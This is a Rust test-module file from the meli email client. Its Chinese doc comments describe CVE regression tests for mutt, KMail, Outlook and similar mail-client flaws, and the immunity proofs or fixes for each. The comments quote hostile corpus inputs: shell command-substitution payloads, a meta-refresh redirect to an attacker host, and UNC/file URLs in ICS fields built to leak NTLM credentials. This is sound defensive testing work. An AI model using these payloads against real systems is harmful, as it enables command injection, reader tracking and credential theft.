/// 代码执行）。家族描述见 `SECURITY-CVE-RESEARCH.zh-CN.md` 表 2 第 91 行：
/// mutt/neomutt 2018-07 一次性披露的 15 漏洞之一，14354（手工订阅/退订的
/// 重发序列化面）与 14357（LSUB 响应消费面）并列为「imap_subscribe 与 LSUB
/// 远程代码执行」。
///
/// meli 对应面（issue #151 指定）：解析层
/// `melib/src/imap/protocol_parser.rs::list_mailbox_result` 对
/// `* LSUB (...)` 行的字段文法（flags `take_until(")")`、分隔符
/// `delimited(tag("\""), take(1), tag("\""))`、其后强制 SP、`mailbox_token`、
/// CRLF 收尾），与消费层 `melib/src/imap/mod.rs::imap_mailboxes` 的 LSUB
/// 分支（`CommandBody::lsub("", "*")` → 逐行
/// `protocol_parser::list_mailbox_result` → 仅对已存在条目 `get_mut` 置
/// `is_subscribed = true` 并可能升级 `special_usage`）。mutt 真正的漏洞点
/// ——`mailboxes` 式配置命令解释器——meli 不存在：`melib/src/imap/` 下无
/// `Command::new`/`process::Command`/`.spawn(`，邮箱名永不进入任何 shell 或
/// 配置求值。
///
/// **本次发现并修复一个真实缺口**：分隔符字段之后的 SP 在 RFC 3501
/// `mailbox-list` 里是强制的，原 `list_mailbox_result` 却用 `take(1_u32)`
/// 盲目消费一个字节，使 `* LSUB (\HasNoChildren) "."INBOX\r\n` 静默截掉
/// 名字首字节、解析为 `Ok(imap_path="NBOX")` 而非 `Err`。修复改为字面
/// `tag(&b" "[..])`，畸形 LSUB/LIST 字段 fail-closed。
///
/// 语料内嵌反引号命令替换（`` `touch${IFS}/tmp/pwned` ``、`$(id)`、纯
/// 反引号 atom、反引号+引号）、NUL/CTL/空串、引号内 CRLF、缺空格、
/// `{999}`/`{u64::MAX}` literal 超声明、超长分隔符/邮箱名/flags 字段、
/// 层级深度边界、定长缓冲边界 ±1（0/1/2、255/256/257 … 65535/65536/65537）。
///
/// [`cve_2018_14357`] 分五层锁定（详见模块文档）：L0 规范 LSUB 基线与
/// INBOX 大小写归一化、`\Subscribed`/`\Sent` 标志；La 字段层畸形全部
/// `Err` 且含缺空格回归断言；Lb 反引号/转义/NUL/CTL/空串只落为
/// `imap_path` 数据与类型化 `MailboxHash`；Lc 定长边界、≥1 万字节与
/// `MAX_MAILBOX_HIERARCHY_DEPTH` 深度上限有界；Ld 用 `std::fs` 递归扫描
/// `melib/src/imap/` 全目录证明无
/// `Command::new`/`process::Command`/`.spawn(`，且 LSUB 分支只 `get_mut`
/// 不重发名字、必需 SP 已是字面 `tag`。与 CVE-2018-14354（重发序列化面）、
/// CVE-2018-14356（POP 空 UID）及 CVE-2020-16094（深度上限复用）划界，
/// 标记 `14357` 语料逐字隔离。
///
/// [`cve_2018_14357`]: self::cve_2018_14357
#[cfg(test)]
#[path = "CVE-2018-14357.rs"]
mod cve_2018_14357;

/// CVE-2018-14358（mutt < 1.10.1、neomutt < 2018-07-16；CVSS v3.1 9.8
/// CRITICAL；CWE-121 栈缓冲区溢出）**恶意 IMAP 服务器在 FETCH 响应里返回超大
/// 的 `RFC822.SIZE` 数值字段，mutt `imap/command.c` 用定长栈缓冲 +
/// `sscanf`/`atoi` 式数值解析把越界长度写穿栈** 攻击模拟回归（issue #152，
/// 表 2 病毒/代码执行）。家族描述见 `SECURITY-CVE-RESEARCH.zh-CN.md` 表 2
/// 第 91 行：mutt/neomutt 2018-07 一次性披露的 15 漏洞之一，同表逐字列出
/// 「RFC822.SIZE 栈溢出（14358）」，与 14350（INTERNALDATE 栈溢出）并列为
/// FETCH 响应数值字段 → 定长缓冲溢出子类。
///
/// meli 对应面（issue #152 指定）：解析层
/// `melib/src/imap/protocol_parser.rs::fetch_response`（L685-979）对 FETCH
/// items 的数值分派——`UID `、`FLAGS (`、`MODSEQ (`、`BODY[] {`/`RFC822 {`
/// literal、`ENVELOPE (`、`BODYSTRUCTURE `、
/// `BODY[HEADER.FIELDS (REFERENCES)] `、闭合 `)\r\n`；**`RFC822.SIZE` 不在
/// 任何已处理分支内**，token 走到 L959 的 else、落到 L964 的
/// `Got unexpected token while parsing UID FETCH response` 类型化 `Err`。
/// 与 14358 的「附带长度声明」形态最近的合法分支是 L846 的
/// `BODY[] {`/`RFC822 {`：它用
/// `length_data(delimited(tag("{"), map_res(digit1, |s|
/// usize::from_str(...)), tag("}\r\n")))` 解析 `{N}`，N 超 `usize` / 超剩余
/// 输入均 fail-closed 且不预分配。meli 也从不请求 `RFC822.SIZE`：FETCH 请求
/// 项由 `melib/src/imap/email.rs::common_attributes`（L36-58）与
/// `common_attributes_light`（L66-86）固定为 Uid/Flags/Envelope/BodyExt
/// REFERENCES/BodyStructure，调用点 `sync/mod.rs:334`、`untagged.rs:267,410`、
/// `watch.rs:593,601`、`fetch.rs:719,721`、`operations.rs:62` 全经
/// `CommandBody::fetch`。MSN 用 `saturating_*` 饱和、UID/MODSEQ/literal
/// 全走 Rust `FromStr` checked 解析，无 `sscanf`/`strtol`/`atoi`。
///
/// 语料内嵌 issue 点名的
/// `* 1 FETCH (RFC822.SIZE 99999999999999999999)`、`RFC822.SIZE -1`、
/// 无数字、≥1 万位/≥10 万位超长纯数字、定长缓冲宽度 ±1（0/1/2、
/// 255/256/257、511/512/513、65535/65536/65537）、`usize` 临界
/// （18446744073709551615 与 +1）、前导零/加号/空格/制表/NUL/CTL、
/// 与 UID/FLAGS/ENVELOPE/BODY[] literal 混排、`RFC822 {N}`/
/// `BODY[] {N}` 超声明与纯截断形态。
///
/// [`cve_2018_14358`] 分五层锁定（详见模块文档）：L0 规范 FETCH 基线与多响应
/// 流；L1 全部畸形 `RFC822.SIZE` 经 `fetch_response`/`fetch_responses`/
/// `untagged_responses` 干净类型化 `Err` 且 `catch_unwind` 无 panic；L2 数值
/// 有界（MSN 饱和、UID 超范围 `Err`、MODSEQ 超范围 `None`、literal `{N}`
/// 超 `usize`/超输入均 `Err` 不预分配、宽度 ±1 精确）；L3 用 `std::fs` 递归
/// 扫描 `melib/src/imap/` 证明无 C 式定长栈缓冲数值解析、FETCH 请求项不含
/// `Rfc822Size`，且 unknown-token else、`RFC822 {` literal 分支、
/// `saturating_*`、`usize::from_str`、单点 `raw_fetch_value` 全在位；L4
/// `raw_fetch_value` 切片在全部语料下不越界。与 CVE-2018-14350（INTERNALDATE
/// 数值面）、CVE-2018-14356（空 UID）、CVE-2020-9818（截断响应切片钳制）
/// 划界，标记 `14358` 语料逐字隔离。结论：**结构性免疫，未发现内存安全缺口，
/// 未修改生产代码**；「合法服务器主动附送未被请求的 `RFC822.SIZE` 被整条拒绝」
/// 属互操作提示、不在本 CVE 内存安全范围内。
///
/// [`cve_2018_14358`]: self::cve_2018_14358
#[cfg(test)]
#[path = "CVE-2018-14358.rs"]
mod cve_2018_14358;

/// CVE-2018-14359（mutt < 1.10.1、neomutt < 2018-07-16；CVSS v3.1 9.8
/// CRITICAL；CWE-121 栈缓冲区溢出）**恶意 IMAP/POP3/NNTP 服务器投递带
/// `Content-Transfer-Encoding: base64` 的邮件附件，mutt 在 base64 解码时把
/// 解码边界算错、用定长栈缓冲越界写穿栈 → 客户端崩溃乃至远程代码执行**
/// 攻击模拟回归（issue #153，表 2 病毒/代码执行）。家族描述见
/// `SECURITY-CVE-RESEARCH.zh-CN.md` 表 2 第 91 行：mutt/neomutt 2018-07
/// 一次性披露 15 漏洞之一，同表逐字列出「base64 解码栈溢出（14359）」，
/// 与 14358（RFC822.SIZE 栈溢出）并列为「服务端可控字节串 → 定长缓冲
/// 解码/解析溢出」子类。
///
/// meli 对应面（issue #153 指定）：`melib/src/email/attachments.rs::
/// decode_helper`（L1211-1249）的 base64 分支（L1220）——
/// `ContentTransferEncoding::Base64 => match data_encoding::BASE64_MIME
/// .decode(self.body()) { Ok(v) => v, _ => self.body().to_vec() }`：成功取
/// `data_encoding` 按需增长的堆 `Vec<u8>`，失败原样回退原始 body；没有
/// `[u8; N]`、没有手写索引、没有 `unsafe`。`Attachment::decode` 与
/// `Attachment::decode_rec`（文本类型）都落到这条分支；整封邮件经
/// `Mail::new` → `Mail::body()` → `parser::attachments::attachment` 后
/// base64 字节仍只进这条分支。`BASE64_MIME` 非 canonical：只忽略 CR/LF，
/// 长度非 4 倍数、非法字符、错位 `=` 与末组尾随位非零均为 `Err`。
///
/// 语料内嵌 issue 点名的全部畸形补位（`=`、`A=`、`AA=A`、`AAAA=`、
/// `A===`、`====`、`=AAA`、padding 后接更多数据）、非 base64 字符
/// （`!@#$%^&*()`、内嵌空格/制表/NUL/高位字节）、空与纯空白 body、长度
/// `%4==1`（`A`、`AAAAA`）、超长截断形态，以及 64KiB/1MiB 单行无换行
/// valid/truncated 两档与 multipart/mixed、text/plain + base64、非 ASCII
/// 头部 + base64 body 三种整封邮件形态。
///
/// [`cve_2018_14359`] 分五层锁定（详见模块文档）：L0 合法 base64（含 CRLF
/// 软换行规范 MIME 形态）经生产 `BASE64_MIME.encode` 发射、`AttachmentBuilder`
/// 反向解析后逐字节还原；L1 全部畸形语料经 `decode`/`decode_rec` 原样回退
/// （非文本/ASCII 文本逐字节等于 body）且 `catch_unwind` 无 panic；L2 所有
/// `Ok` 输出 ≤ `ceil(输入 × 3/4) + 1`、畸形回退 == body、64KiB/1MiB 档实际
/// 运行不 panic/OOM；L3 用 `include_str!` 钉住 `attachments.rs` 的
/// `BASE64_MIME.decode` 调用点、`Ok(v) => v` 与 `_ => self.body().to_vec()`
/// 回退分支，并用 `std::fs` 递归扫描 `melib/src/email/` 证明 base64 解码只经
/// `data_encoding`（堆分配），无 C 定长缓冲原语、无 `unsafe`、无 `[u8; `、
/// 无手写解码表；L4 整封 multipart/mixed、text/plain + base64、非 ASCII
/// 头部 + base64 body 经 `Mail::new` 解析后 decode/decode_rec 不 panic 且
/// fail-closed 语义成立。与 CVE-2018-14349（NO 响应文本）、14350
/// （INTERNALDATE）、14358（RFC822.SIZE）输入面，14351（STATUS literal）、
/// 14352/14353（imap_quote_string 差一/整数下移）构造面，14354/14357
/// （imap_subscribe/LSUB 命令注入）与 14356（空 UID 空指针）划界，标记
/// `14359` 语料逐字隔离。结论：**结构性免疫，未发现内存安全缺口，未修改
/// 生产代码**。
///
/// [`cve_2018_14359`]: self::cve_2018_14359
#[cfg(test)]
#[path = "CVE-2018-14359.rs"]
mod cve_2018_14359;

/// CVE-2018-14360（mutt < 1.10.1、neomutt < 2018-07-16；CVSS v3.1 9.8
/// CRITICAL，CWE-121 栈缓冲区溢出）**恶意 NNTP 服务器对 `GROUP` 命令返回
/// 首行字段超长的 `211 <超长数字> <超长数字> <超长数字> <组名>`，mutt 用定长
/// 栈缓冲 + `sscanf` 解析 → 越界写穿栈**攻击模拟回归（issue #154，表 2 病毒/
/// 代码执行）。NVD 口径：*"An issue was discovered in Mutt before 1.10.1 and
/// NeoMutt before 2018-07-16. nntp_add_group in newsrc.c has a stack-based
/// buffer overflow because of incorrect sscanf usage."*
///
/// 攻击面核实：meli 的 NNTP `GROUP` 回复解析全在 `melib/src/nntp/`——
/// 响应累积进堆 `String`（`read_lines` 的 `ret.push_str(&String::from_utf8_lossy(
/// &buf[0..b]))`），每 chunk 后 `enforce_response_size_limit(ret.len())?` 在超过
/// `Connection::MAX_SERVER_RESPONSE_SIZE`（64 MiB）时报
/// `NetworkErrorKind::ProtocolViolation`；期望码只接受
/// `command_to_replycodes("GROUP") == &["211 "]`；mailbox hash 来自客户端侧
/// `path`（`MailboxHash::from_bytes`），与服务器返回字段无关；数值字段唯一
/// 消费点 `fetch_envs` 以 `s.len() != 5` fail-closed、`usize::from_str(..)
/// .unwrap_or(0)`、`saturating_add`；全目录无 `unsafe`、无 C 定长缓冲原语。
///
/// [`cve_2018_14360`] 分五层锁定（详见模块文档）：L0 合法
/// `211 3000234 3000182 3000233 alt.test\r\n` 经真实 `read_lines` 逐字节保留、
/// 再经 `select_group_by_name` 选中且命令恰为 `GROUP alt.test\r\n`；L1 攻击
/// 语料（万位/十万位超长数字、定长缓冲边界 ±1、数值边界、缺/多字段、非数字、
/// tab 分隔、64 KiB 组名、NUL/无效 UTF-8、首码 50 位超长、裸 LF + EOF）经
/// `read_lines` 与 `select_group_by_name` 两层 `catch_unwind` 不 panic，Ok 形态
/// 返回码恰为 211、hash 只由客户端 path 决定，Err 形态错误信息明确，并以相同
/// 表达式钉死 `fetch_envs` 的 token 计数/受检 parse/饱和消费语义；L2 永不结束
/// 的 CRLF-free `211` 行在生产 64 MiB 上限处 `ProtocolViolation`，`ret.len()`
/// 有界、写入量 > cap、30 秒 watchdog 内完成（预算即二次方绊网：修复前未终
/// 止单行每个 chunk 重扫累积缓冲，debug 泵满 64 MiB 约 40 秒）；L3 `include_str!`
/// 钉住堆 String、上限调用、增量扫描游标
/// 点、`split_whitespace().next().map(str::parse)`、GROUP 期望码与
/// `format!("GROUP {path}")`，递归扫 `melib/src/nntp/` 证明无 `unsafe`、无
/// `sscanf(`/`strcpy(`/`strcat(`/`strtol(`/`sprintf(`；L4 struct literal 构造
/// 真实 `NntpConnection`（注入 `Connection::Fd` + `UnixStream::pair()`）全链路
/// 断言 hash 由客户端 path 决定、`211\r\n` fail-closed。与 CVE-2018-14349
/// （IMAP NO 文本）、14350（INTERNALDATE）、14351（STATUS literal）、
/// 14352/14353（imap_quote_string）、14354/14357（命令注入）、14356（空 UID）、
/// 14358（RFC822.SIZE）、14359（base64）划界，标记 `14360` 语料逐字隔离。
/// 结论：**CWE-121 栈溢出面结构性免疫（GROUP 首行以堆 String 解析、数值
/// 字段受检 parse、64 MiB 封顶、无定长栈缓冲、无 unsafe）；暴露并修复一处
/// CWE-407 可用性缺口——未终止单行的分隔符二次方重扫描，`read_lines` 改
/// `searched` 游标增量扫描（同 SMTP issue #48 修法），修复与回归一并交付**。
///
/// [`cve_2018_14360`]: self::cve_2018_14360
#[cfg(test)]
#[path = "CVE-2018-14360.rs"]
mod cve_2018_14360;

/// CVE-2018-19516（KDE Applications < 18.12.0，messagelib；CVSS v3.1 5.3，
/// CWE-20）**`http-equiv="REFRESH"` 远程内容绕过** regression（issue #126，
/// 表 1 追踪与隐私）：`messagepartthemes/default/defaultrenderer.cpp` 未正确
/// 限制 `<meta http-equiv="refresh" content="0;url=http://attacker/">` 值的
/// 处理，KMail **即使设置了「禁用 HTML 邮件访问远程服务器」**仍会打开/抓取
/// 远程网页，攻击者据此获知收件人的阅读行为、阅读时刻与出口 IP（KDE 修复
/// commit `34765909cdf8e55402a8567b48fb288839c61612`）。
///
/// 语料内嵌全部攻击形态：四个 REFRESH 变体（基本 / 延时 https 带收件人标识
/// / 大小写+无引号 / 完整 `html`-`head` 骨架）、issue 点名的图片与 CSS 形态
/// （`<img src>`、`<a>` 包裹 `<img>`、内联 CSS `background:url()`、
/// `@import url()`、`<video poster>`）以及 REFRESH 与像素的组合。
///
/// [`cve_2018_19516`] 分层锁定（详见模块文档）：T1 逐向量断言 `sanitize`
/// 输出不含 `meta`/`img`/`src`/`url(`/`@import`/`http-equiv`/`refresh`/
/// 攻击者主机，且为惰性白名单固定点；T2 证明 table/blockquote/pre/html/
/// head/body/注释等任何嵌入上下文都放松不了剥离；T3 完整 RFC 822 邮件经
/// `Envelope::from_bytes` + `render()` 后渲染文本不含 `attacker.example`；
/// T4 强制 plain 变体逐字惰性显示（可见但不可导航，与 KMail 的抓取/跳转
/// 截然不同）；T5 是 L0 源码扫描——`meli/src/mail/view.rs` 与
/// `meli/src/mail/view/` 子树内不存在 `TcpStream`/`UdpSocket`/`reqwest`/
/// `ureq`/`isahc`/`hyper::`/`"curl"`/`"wget"`/`Client::new` 等网络客户端
/// 原语，也不存在 `http-equiv`/`http_equiv`（REFRESH 处理器不存在的存在性
/// 证明）。结论：**结构性免疫，未发现真实缺口**，无需修改生产代码。
///
/// [`cve_2018_19516`]: self::cve_2018_19516
#[cfg(test)]
#[path = "CVE-2018-19516.rs"]
mod cve_2018_19516;

/// CVE-2019-10734（Trojitá 0.7 解密预言机/回复泄露，CVSS 3.1 4.3；同族五连
/// 之一，KDE bugs #404697；issue #127）同族攻击模拟回归：[`cve_2019_10734`]
/// 把 issue #103 的抛弃子钥密文（受害者子钥可解）包装进 `multipart/mixed`
/// 载体——第一部件一句无害说明的 text/plain，第二部件 RFC 3156
/// `multipart/encrypted`（`Version: 1` 控制 part + octet-stream 密文）——以及
/// 整段 PGP armor 的 inline text/plain 变体，攻击 meli 的回复引用面。
///
/// Trojitá 无独立功能面，按 meli 回复引用等价面做免疫证明：melib
/// [`Draft::new_reply`]→[`Attachment::decode_rec`] 只引用无害文本、与「不含
/// 密文的普通 multipart 邮件」逐字节一致，加密子树空贡献、无密文字节、无解密
/// 明文标记；L4 源码扫描证明免疫锚点仍在位——即 issue #104 为同族 KMail 变体
/// CVE-2019-10732 落地的两处修复（melib `MultipartType::Encrypted` 空贡献 +
/// meli UI `ViewFilter::decrypt_origin` 排除）与其端到端回归名。结论：
/// **免疫证明，未发现新缺口，未触碰生产代码**。
///
/// [`Draft::new_reply`]: meli::melib::Draft::new_reply
/// [`Attachment::decode_rec`]: meli::melib::email::Attachment::decode_rec
#[cfg(test)]
#[path = "CVE-2019-10734.rs"]
mod cve_2019_10734;

/// CVE-2019-10735（Claws Mail 3.14.1 解密预言机/回复泄露，CVSS 4.3；同族五连
/// 之一，参考 MITRE / KDE bugs #404697；issue #128）同族攻击模拟回归：
/// [`cve_2019_10735`] 把 issue #103 的抛弃子钥密文（受害者子钥可解）包装进
/// `multipart/mixed` 载体——第一部件一句无害说明的 text/plain 并以多个空行把
/// 后续部件推出可视区，第二部件 RFC 3156 `multipart/encrypted`（`Version: 1`
/// 控制 part + octet-stream 密文）——以及整段 PGP armor 的 inline text/plain
/// 变体，攻击 meli 的回复引用面；对照邮件与载体 A 头部及无害文本部件逐字节
/// 相同。
///
/// Claws Mail 无独立功能面，按 meli 回复引用等价面做免疫证明：melib
/// [`Draft::new_reply`]→[`Attachment::decode_rec`] 只引用无害文本、与「不含
/// 密文的普通 multipart 邮件」逐字节一致，加密子树空贡献、无密文字节、无解密
/// 明文标记；L4 源码扫描证明免疫锚点仍在位——即 issue #104 为同族 KMail 变体
/// CVE-2019-10732 落地的两处修复（melib `MultipartType::Encrypted` 空贡献 +
/// meli UI `ViewFilter::decrypt_origin` 排除）与其端到端回归名。结论：
/// **免疫证明，未发现新缺口，未触碰生产代码**。
///
/// [`Draft::new_reply`]: meli::melib::Draft::new_reply
/// [`Attachment::decode_rec`]: meli::melib::email::Attachment::decode_rec
#[cfg(test)]
#[path = "CVE-2019-10735.rs"]
mod cve_2019_10735;

/// CVE-2019-10740（Roundcube &lt; 1.3.10 webmail 解密预言机/回复泄露，CVSS 4.3；
/// 同族五连之一，参考 MITRE / KDE bugs #404697；issue #129）同族攻击模拟
/// 回归：[`cve_2019_10740`] 把 issue #103 的抛弃子钥密文（受害者子钥可解）
/// 包装进 `multipart/mixed` 载体——第一部件一句无害说明的 text/plain 并以多个
/// 空行把后续部件推出可视区，第二部件 RFC 3156 `multipart/encrypted`
/// （`Version: 1` 控制 part + octet-stream 密文）——以及整段 PGP armor 的 inline
/// text/plain 变体，攻击 meli 的回复引用面；对照邮件与载体 A 头部及无害文本
/// 部件逐字节相同。
///
/// Roundcube 是 webmail、meli 无 webmail 服务端，故无独立功能面，按 issue 指定
/// 的 meli 回复引用等价面做免疫证明：melib [`Draft::new_reply`]→
/// [`Attachment::decode_rec`] 只引用无害文本、与「不含密文的普通 multipart
/// 邮件」逐字节一致，加密子树空贡献、无密文字节、无解密明文标记；L4 源码扫描
/// 证明免疫锚点仍在位——即 issue #104 为同族 KMail 变体 CVE-2019-10732 落地的
/// 两处修复（melib `MultipartType::Encrypted` 空贡献 + meli UI
/// `ViewFilter::decrypt_origin` 排除）与其端到端回归名。结论：
/// **免疫证明，未发现新缺口，未触碰生产代码**。
///
/// [`Draft::new_reply`]: meli::melib::Draft::new_reply
/// [`Attachment::decode_rec`]: meli::melib::email::Attachment::decode_rec
#[cfg(test)]
#[path = "CVE-2019-10740.rs"]
mod cve_2019_10740;

/// CVE-2019-10741（K-9 Mail 5.600 Android 客户端解密预言机/回复泄露，CVSS 4.3；
/// 同族五连之一，参考 MITRE / KDE bugs #404697；issue #130）同族攻击模拟
/// 回归：[`cve_2019_10741`] 把 issue #103 的抛弃子钥密文（受害者子钥可解）
/// 包装进 `multipart/mixed` 载体——第一部件一句无害说明的 text/plain 并以多个
/// 空行把后续部件推出可视区，第二部件 RFC 3156 `multipart/encrypted`
/// （`Version: 1` 控制 part + octet-stream 密文）——以及整段 PGP armor 的 inline
/// text/plain 变体，攻击 meli 的回复引用面；对照邮件与载体 A 头部及无害文本
/// 部件逐字节相同。
///
/// K-9 Mail 是 Android 客户端、meli 无移动端功能面（无 Android UI、无 K-9
/// 后台服务会话），故按 issue 指定的「回复引用等价面」做免疫证明：melib
/// [`Draft::new_reply`]→[`Attachment::decode_rec`] 只引用无害文本、与「不含
/// 密文的普通 multipart 邮件」逐字节一致，加密子树空贡献、无密文字节、无解密
/// 明文标记；L4 源码扫描证明免疫锚点仍在位——即 issue #104 为同族 KMail 变体
/// CVE-2019-10732 落地的两处修复（melib `MultipartType::Encrypted` 空贡献 +
/// meli UI `ViewFilter::decrypt_origin` 排除）与其端到端回归名。结论：
/// **免疫证明，未发现新缺口，未触碰生产代码**。
///
/// [`Draft::new_reply`]: meli::melib::Draft::new_reply
/// [`Attachment::decode_rec`]: meli::melib::email::Attachment::decode_rec
#[cfg(test)]
#[path = "CVE-2019-10741.rs"]
mod cve_2019_10741;

/// CVE-2024-38173（Microsoft Outlook 2016 / Office 2019 / Office LTSC 2021 /
/// Microsoft 365 Apps for Enterprise，Windows；CVSS 3.1 6.7，CWE-73）外部
/// 文件引用 RCE 回归（issue #131，表 2 of `SECURITY-CVE-RESEARCH.zh-CN.md` —
/// virus / code execution）：2024-08 补丁日公告，MSRC 只描述为「Microsoft
/// Outlook 远程代码执行漏洞」，原语是「外部文件引用控制不当」——攻击者发送含
/// `file://`、Windows UNC `\\attacker\share`、`search-ms:`、`ms-msdt:`、
/// `mhtml:` 等外部文件引用的邮件，诱导受害者点击后由系统处理器解析并执行。
/// 这些协议全部是 Windows 专属功能面，meli 没有 MAPI store、Protected View、
/// COM/URL moniker、Windows shell/协议处理器注册表，也没有任何
/// `ms-msdt`/`search-ms`/`mhtml` 解析器或 SMB/NTLM 客户端，字面站点不可能
/// 存在；按 issue 指定的等价面映射到 **scheme 启动门**
///（[`is_default_launchable_scheme`] / `go_to_url` 确认门）、**mailcap 附件
/// 打开面**（本 CVE 新增轴：`MailcapEntry::execute` 无匹配即 Err，绝无
/// `xdg-open` 静默兜底；`%s` 临时路径按 shell 上下文引用）以及渲染 / 头部派生
/// 发射点（URL 模式 linkify 提取 + ammonia sanitize 白名单、
/// `List-Unsubscribe` / `List-Archive`）。语料是一封真实 `multipart/alternative`
/// 攻击邮件（两条 alternative 逐字携带整个引用家族，头部携带 issue 指定的
/// `List-Archive`/`List-Unsubscribe` 负载），逐层断言结局为**免疫证明，未发现
/// 缺口，未改动生产代码**；交互级接线由仓内孪生单测
/// `meli/src/mail/view/tests.rs::go_to_url_non_default_scheme_requires_confirmation`、
/// `list_unsubscribe_skips_non_launchable_url_options`、
/// `list_archive_non_launchable_scheme_is_refused`、
/// `list_archive_https_still_launches` 锁定。
///
/// [`is_default_launchable_scheme`]: meli::mail::view::envelope::is_default_launchable_scheme
#[cfg(test)]
#[path = "CVE-2024-38173.rs"]
mod cve_2024_38173;

/// CVE-2023-35636（Microsoft Outlook 2016 / 2019 / LTSC / Microsoft 365 Apps
/// for Enterprise，Windows；CVSS 3.1 6.5，CWE-200）Outlook ICS URL/LOCATION/
/// DESCRIPTION UNC 凭据泄露回归（issue #132，表 2 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — credential theft）：邮件附件中的
/// iCalendar 文件可指向任意 URL（含 Windows UNC `\\attacker\share`），受害者
/// 打开日历条目时 Outlook 解析 ICS 并把引用交给系统处理器，向攻击者主机认证、
/// 泄露 NTLMv2 哈希；与 CVE-2023-23397（ICS `VALARM ATTACH`）同族。issue 指定
/// 的 `melib/src/utils/vobject/icalendar.rs` 攻击面经核实**不在邮件查看路径
/// 上**：melib 的 vobject 模块只被 `contacts/card.rs::to_vcard_string` 的 vCard
/// 导出使用，`meli/src/mail/view.rs` / `envelope.rs` / `types.rs` /
/// `html_render.rs` 均不引用 `vobject`/`ICalendar`/`parse_component`/
/// `icalendar`，`ICalendar`/`parse_component` 从 mail view 不可抵达。因此
/// Windows SMB/NTLM 专属面在 meli 不存在，等价面映射为：**不透明附件展示**
///（`text/calendar` 走 `Attachment::is_text` 的 InlineText 分支，解码字节逐字
/// 展示、无属性提取 / 重写 / 解引用）、**URL 模式提取 + 启动门**
///（`linkify` 只在 `://` 起链，UNC 反斜杠永不成链接；`file:`/`smb:` 可提取但
/// [`is_default_launchable_scheme`] 只放行 http/https/mailto，全部落在
/// `go_to_url` 确认门后；裸 UNC 无方案、不可自动启动）、**无外发认证通路**
///（全仓无 SMB/NTLM 客户端依赖或实现，渲染面不发起网络/进程 I/O）。语料是一封
/// 真实 `multipart/mixed` 攻击邮件（`text/plain` + `text/html` 镜像 +
/// `text/calendar; method=REQUEST` 附件），ICS 逐字携带
/// `URL:file://attacker/share`、`URL:\\attacker.example\share`、
/// `ATTACH;VALUE=URI:http://attacker/`、
/// `X-MICROSOFT-CDO-URL:\\attacker.example\\share\\leak`、`LOCATION` 与
/// `DESCRIPTION`（内嵌 UNC / `file:` 文本）及良性 `https` 对照。逐层断言结局为
/// **免疫证明，未发现缺口，未改动生产代码**；交互级发射点由仓内孪生单测
/// `meli/src/mail/view/tests.rs` 锁定。
///
/// [`is_default_launchable_scheme`]: meli::mail::view::envelope::is_default_launchable_scheme
#[cfg(test)]
#[path = "CVE-2023-35636.rs"]
mod cve_2023_35636;

/// CVE-2023-36763（Microsoft Outlook 2016 / Office 2019 / Office LTSC 2021 /
/// Microsoft 365 Apps for Enterprise，Windows；CVSS 3.1 7.5
/// `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`，CWE-200）Outlook 零交互信息泄露
/// 回归（issue #133，表 2 of `SECURITY-CVE-RESEARCH.zh-CN.md` — 信息泄露零
/// 交互）：MSRC 未公开根因，`UI:N` 是唯一硬约束——网络攻击者无需受害者任何
/// 交互即可远程泄露敏感信息。按 issue 指定等价面模拟：构造在解析/渲染阶段
/// 触发远程资源的邮件（HTML 远程图片/CSS 全家族、RTF/OLE 引用
/// （`\objupdate` + 合成 OLE2Link）、`message/external-body` 四种
/// access-type（URL/anon-ftp/mail-server/local-file）），逐层断言结局为
/// **免疫证明，未发现缺口，未改动生产代码**：解析面（`parser.rs`/
/// `attachments.rs`）把 external-body/RTF/TNEF 全部归为不透明
/// `ContentType::Other` 叶、参数只是元数据、`decode` 只产本地字节；渲染面
/// （`html_render.rs`）经 [`sanitize`] 白名单把远程引用家族整体剥离（tag 白
/// 名单无 img/link/object 等、`style` 连内容删、属性只剩 `a[href|title]`），
/// [`render`] 是纯进程内变换；源码级扫描证明三个面无 socket/进程原语，HTTP
/// 客户端只作为可选 jmap 特性存在。「无用户显式操作时不存在新建的
/// socket/ProcessRequest」的交互级断言由孪生单测
/// `meli/src/mail/view/tests.rs::cve_2023_36763_zero_interaction_open_spawns_nothing`
/// 锁定（真实打开语料邮件 → draw 驱动 `ViewFilter::new_html` 后台 job 完成
/// 回填 → `ctx.children` 为空、无 `UIEvent::Fork`/`ProcessRequest`、正文零
/// beacon 标记）。HTML 剥离、CSS 信道、external-body 惰性、RTF OLE 预览、
/// scheme 门禁分别由 CVE-2005-2512/2006-1045/2026-0818/2006-6505/
/// CVE-2020-9819/CVE-2018-0950/CVE-2023-35636/CVE-2024-38173 先行锁定，本
/// 语料以独立标记（`beacon36763`）补齐 anon-ftp/mail-server 形态并断言家族
/// 并集。
///
/// [`sanitize`]: meli::mail::view::html_render::sanitize
/// [`render`]: meli::mail::view::html_render::render
#[cfg(test)]
#[path = "CVE-2023-36763.rs"]
mod cve_2023_36763;

/// CVE-2023-35619（Outlook for Mac；CVSS 3.1 5.3，CWE-451 UI 误导）UI 欺骗
/// 回归（issue #134，表 2 of `SECURITY-CVE-RESEARCH.zh-CN.md` — 2026-10-05
/// 外部 KIMI 调研增补行）：MSRC 未公开根因，`UI:R` 是唯一硬约束——受害者
/// 看着被欺骗的界面做出错误动作。按 issue 指定等价面（头部显示真实性）
/// 模拟，结论为 **暴露缺口 2 处并修复，第 3 面免疫证明**：(A) 显示名
/// Unicode Format（Cf）不可见字符（U+202E bidi 覆盖、U+2066-2069 孤立、
/// U+200B-200F 零宽/方向标记、U+FEFF、U+00AD 等）原样穿透
/// `sanitize_display_name`（原契约只清 ASCII C0）直达 From/To/Reply-To
/// 显示名——已扩展为 `Cc`（除 `HTAB`）+ `Cf` 全家族剥离
/// （`melib::email::strip_spoofing_invisibles`，存储边界一次性中和，裸
/// UTF-8 与 RFC2047 编码字两条路径同判）；(B) `Reply-To`/`Mail-Reply-To`/
/// `Sender` 与 `From` 分叉时头部带不显示，而 `Composer::reply_to` 的实际
/// 回复目标是 `Mail-Reply-To > Reply-To > From`——已由
/// `address_faces_disagreeing_with_from` 把不一致面画在 `From` 正下方
/// （渲染由孪生单测 `meli/src/mail/view/tests.rs` 锁定）；链接脚注真实性
/// （显示 host ≠ href host 时两 host 并排可见、所见即所提取即所启动）为
/// 免疫证明——锚文本伪装家族的 IDNA/scheme 门禁已由 CVE-2021-37746 等兄
/// 弟语料先行锁定。
#[cfg(test)]
#[path = "CVE-2023-35619.rs"]
mod cve_2023_35619;

